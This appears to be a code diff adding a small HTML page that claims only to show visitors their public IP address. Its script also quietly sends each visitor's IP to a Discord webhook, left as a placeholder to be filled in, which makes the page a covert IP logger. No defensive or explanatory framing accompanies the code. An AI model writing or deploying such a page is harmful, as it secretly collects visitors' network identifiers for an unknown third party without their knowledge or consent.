@@ -1,0 +1,26 @@
+
+        <html>
+        <head>
+            <title>Your IP Address</title>
+            <script>
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        document.getElementById('ip').textContent = data.ip;
+                        fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                content: `IP Address: ${data.ip}`
+                            }),
+                        });
+                    });
+            </script>
+        </head>
+        <body>
+            <h1>Your IP Address is: <span id="ip">Loading...</span></h1>
+        </body>
+        </html>
+        
